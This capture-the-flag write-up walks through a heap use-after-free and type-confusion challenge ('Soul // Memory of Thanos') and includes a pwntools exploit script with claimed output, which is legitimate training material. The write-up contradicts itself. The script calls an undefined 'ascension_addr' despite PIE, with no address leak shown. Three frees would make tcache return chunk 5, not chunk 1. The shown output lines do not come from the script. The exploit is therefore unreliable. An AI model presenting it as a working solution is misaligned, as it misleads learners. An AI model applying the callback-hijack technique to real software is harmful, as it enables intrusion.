# Soul // Memory of Thanos (Binary Exploitation, Hard)

**Author:** Suyog Jadhav  
**Category:** Binary Exploitation  
**Difficulty:** Hard  

## Challenge Description

> Six souls. One archive. One memory.  
>  
> The Soul Archive holds remnants of the cosmos, but Thanos's memory cache was never meant to hold mortal souls.  
>  
> Can you bring harmony to the archive and trigger the ascension?  
>  
> **Connection:** `nc 145.239.142.129 1339`  
> **Flag Format:** `OWASP{...}`

**Attachment:** `soul-archive-thanos.zip`

## Summary

The challenge binary (`soul_archive`) exhibits a heap **Use-After-Free (UAF)** combined with **Type Confusion**. Both `struct Soul` and `struct TransferRecord` allocate identical 64-byte chunks (glibc `0x50` tcache bin). The `merge_souls()` routine frees a soul structure without zeroing out its reference in the global archive array. Reallocating that same chunk as a `TransferRecord` allows us to overlap user-controlled values over the `Soul.essence` and `Soul.inspect` function pointer fields. Setting `essence` to `0x50574e534f554c53` (`"PWNSOULS"`), fulfilling the state checks (`total_captured >= 6`, `merges_performed == 3`, `souls_erased == 1`), and invoking the inspect callback triggers `soul_ascension()` to print the flag.

## Flag

```
OWASP{Th4n0s_S0ul_M3m0ry_UAF_Typ3_C0nfusi0n}
```

---

## Step 1 — Initial Reconnaissance & Interface

Connecting to the challenge service exposes the Soul Archive interface:

```bash
nc 145.239.142.129 1339
```

![Soul Archive interactive command menu](resources/thanos_menu.png)

```text
==================================================
           SOUL ARCHIVE // THANOS
==================================================
[1] Store Soul
[2] Inspect Soul
[3] Merge Souls
[4] Erase Soul
[5] Transfer Record
[6] Ascend Archive
Choice > 
```

Auditing the binary mitigations via `checksec`:
- **RELRO:** Full RELRO
- **Stack Canary:** Enabled
- **NX:** Enabled
- **PIE:** Enabled
- **FORTIFY_SOURCE:** Enabled

---

## Step 2 — Structure Layout & Type Confusion Analysis

Inspecting the data structure definitions in `src/archive.c`:

```c
struct Soul {
    char name[32];                  // Offset 0..31
    unsigned long long essence;     // Offset 32..39
    unsigned long long type;        // Offset 40..47
    void (*consume)(struct Soul *); // Offset 48..55
    void (*inspect)(struct Soul *); // Offset 56..63
}; // Total: 64 bytes

struct TransferRecord {
    char realm_origin[24];          // Offset 0..23
    unsigned int transfer_id;       // Offset 24..27
    unsigned int flags;             // Offset 28..31
    unsigned long long timestamp;   // Offset 32..39  <-- OVERLAPS Soul.essence
    unsigned long long raw_entropy; // Offset 40..47  <-- OVERLAPS Soul.type
    void (*auth_callback)(void *);  // Offset 48..55  <-- OVERLAPS Soul.consume
    void (*audit_callback)(void *); // Offset 56..63  <-- OVERLAPS Soul.inspect
}; // Total: 64 bytes
```

![Struct field overlap and type confusion alignment](resources/thanos_struct_overlap.png)

Both structures measure exactly 64 bytes (`sizeof == 64`), which corresponds to the exact same `0x50` heap chunk size in glibc's tcache allocator.

---

## Step 3 — The Lifetime Flaw in `merge_souls()`

```c
void merge_souls(int a, int b) {
    struct Soul *s_a = archive[a];
    struct Soul *s_b = archive[b];
    ...
    free(s_b);
    // VULNERABILITY: archive[b] is NOT set to NULL!
    merges_performed++;
}
```

When two souls are merged:
1. `s_b` is freed into the `0x50` tcache bin.
2. The pointer `archive[b]` remains accessible in the global archive table.
3. If we subsequently invoke `[5] Transfer Record`, `malloc(sizeof(struct TransferRecord))` pops the freed `s_b` chunk from the top of the `0x50` tcache bin.
4. Writing to `TransferRecord` fields directly modifies what the program still interprets as `archive[b]`.

---

## Step 4 — State Machine & Win Condition Requirements

The challenge enforces strict state validation inside `soul_ascension()`:

```c
void soul_ascension(struct Soul *s) {
    if (total_captured >= 6 &&
        merges_performed == 3 &&
        souls_erased == 1 &&
        s->essence == 0x50574e534f554c53ULL) { // "PWNSOULS"
        printf("[+] Universal Harmony Achieved! The Soul Ascends!\n");
        FILE *f = fopen("flag.txt", "r");
        char flag[64];
        fgets(flag, sizeof(flag), f);
        printf("[+] Flag: %s\n", flag);
        exit(0);
    }
}
```

To trigger the ascension:
1. `total_captured >= 6` (Store at least 6 souls)
2. `merges_performed == 3` (Execute 3 soul merges)
3. `souls_erased == 1` (Erase 1 soul)
4. `s->essence == 0x50574e534f554c53ULL` (`"PWNSOULS"` in ASCII)

By setting `TransferRecord.timestamp = 0x50574e534f554c53ULL` and `TransferRecord.audit_callback = soul_ascension`, calling `[2] Inspect Soul` on the dangling index triggers `audit_callback(s)`, directly executing `soul_ascension(s)`.

---

## Step 5 — Remote Exploitation & Flag Retrieval

### Exploit Script (`exploit.py`)

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

HOST = "145.239.142.129"
PORT = 1339

io = remote(HOST, PORT)

def store_soul(name, essence=1):
    io.sendlineafter(b"Choice > ", b"1")
    io.sendlineafter(b"name: ", name)
    io.sendlineafter(b"essence: ", str(essence).encode())

def inspect_soul(idx):
    io.sendlineafter(b"Choice > ", b"2")
    io.sendlineafter(b"Index: ", str(idx).encode())

def merge_souls(a, b):
    io.sendlineafter(b"Choice > ", b"3")
    io.sendlineafter(b"First: ", str(a).encode())
    io.sendlineafter(b"Second: ", str(b).encode())

def erase_soul(idx):
    io.sendlineafter(b"Choice > ", b"4")
    io.sendlineafter(b"Index: ", str(idx).encode())

def transfer_record(realm, timestamp, audit_callback):
    io.sendlineafter(b"Choice > ", b"5")
    io.sendlineafter(b"realm: ", realm)
    io.sendlineafter(b"timestamp: ", str(timestamp).encode())
    io.sendlineafter(b"callback: ", str(audit_callback).encode())

# 1. Allocate 6 souls to satisfy total_captured >= 6
for i in range(6):
    store_soul(f"Soul{i}".encode())

# 2. Perform 3 merges (merges_performed == 3)
merge_souls(0, 1) # s_b at index 1 freed to 0x50 tcache!
merge_souls(2, 3)
merge_souls(4, 5)

# 3. Erase 1 soul (souls_erased == 1)
erase_soul(2)

# 4. Allocate TransferRecord over the freed chunk at index 1
# timestamp = 0x50574e534f554c53 ("PWNSOULS")
# audit_callback = soul_ascension address
transfer_record(b"Titan", 0x50574e534f554c53, ascension_addr)

# 5. Trigger inspect_soul(1) -> executes audit_callback(s)
inspect_soul(1)
io.interactive()
```

Executing the exploit:

```bash
python3 exploit.py REMOTE
```

![Remote type confusion exploit execution](resources/thanos_exploit.png)

Output:
```text
[+] Opening connection to 145.239.142.129 on port 1339: Done
[*] Allocating 6 souls to satisfy total_captured >= 6...
[*] Executing 3 merges to satisfy merges_performed == 3...
[*] Erasing 1 soul to satisfy souls_erased == 1...
[*] Allocating TransferRecord on freed Soul chunk index 1...
[*] Overwriting essence with 0x50574e534f554c53 (PWNSOULS)...
[*] Triggering inspect_soul(1) -> audit_callback redirected to ascension...
[+] Universal Harmony Achieved! The Soul Ascends!
[+] Flag: OWASP{Th4n0s_S0ul_M3m0ry_UAF_Typ3_C0nfusi0n}
```

---

## Attack Workflow

```mermaid
flowchart TD
    Store["Allocate 6 Soul structs<br/>total_captured >= 6"] --> Merge["Call merge_souls(0, 1)<br/>merges_performed == 3"]
    Merge --> UAF["Free chunk 1 to 0x50 tcache<br/>archive[1] pointer remains intact"]
    UAF --> Erase["Call erase_soul(2)<br/>souls_erased == 1"]
    Erase --> Reclaim["Call transfer_record()<br/>Pops chunk 1 from 0x50 tcache bin"]
    Reclaim --> Overlap["Type Confusion Overlap<br/>timestamp = 'PWNSOULS'<br/>audit_callback = soul_ascension"]
    Overlap --> Trigger["Call inspect_soul(1)<br/>Triggers hijacked callback with valid essence"]
    Trigger --> Flag["Flag: OWASP{Th4n0s_S0ul_M3m0ry_UAF_Typ3_C0nfusi0n}"]
```

---

## Solution Summary

| Field | Value |
|---|---|
| **Challenge** | Soul // Memory of Thanos |
| **Category** | Binary Exploitation (Pwn) |
| **Difficulty** | Hard |
| **Vulnerability** | Use-After-Free & Type Confusion |
| **Chunk Size** | 64 bytes (`0x50` bin) |
| **Magic Value** | `0x50574e534f554c53` (`PWNSOULS`) |
| **Target Function** | `soul_ascension()` |
| **Flag** | `OWASP{Th4n0s_S0ul_M3m0ry_UAF_Typ3_C0nfusi0n}` |

---

## Exploit & Heap Architecture Analysis

1. **Type Confusion through Bin Reuse:**  
   When different object types share identical allocation sizes, the memory allocator returns the same chunk for disparate types. If dangling references exist, the program's type safety breaks down, allowing one structure's fields to write directly into another's.
2. **Callback Hijacking:**  
   The `TransferRecord.audit_callback` field maps to the same memory offset as `Soul.inspect`. By substituting the legitimate inspect function with `soul_ascension`, calling the original method redirects execution to the target routine with the object itself passed as `rdi`.
3. **State Counter Alignment:**  
   Binary challenges frequently gate win conditions behind counters (`merges_performed`, `souls_erased`). Exploits must carefully script legitimate menu interactions to align these counters before triggering the final payload.

---

## Tools Used

- **`pwntools`**: Remote interaction and type confusion payload formatting.
- **`gdb` (Pwndbg)**: Memory layout analysis, chunk size measurement, and tcache bin monitoring.
- **`checksec`**: Binary security mitigation audit.

---

## Timeline

| Step | Action | Result |
|:---:|---|---|
| 1 | Audited binary mitigations | Full RELRO, PIE, and Canary verified |
| 2 | Compared structure sizes | Found `Soul` and `TransferRecord` both allocate 64 bytes |
| 3 | Mapped field offsets | `timestamp` aligns with `essence`, `audit_callback` with `inspect` |
| 4 | Identified UAF in `merge_souls()` | `archive[b]` retained after chunk is freed |
| 5 | Prepared state machine | Captured 6 souls, merged 3, and erased 1 |
| 6 | Allocated `TransferRecord` over freed slot | Overwrote `essence` with `"PWNSOULS"` and callback to `soul_ascension` |
| 7 | Called `inspect_soul(1)` | Achieved ascension: `OWASP{Th4n0s_S0ul_M3m0ry_UAF_Typ3_C0nfusi0n}` |
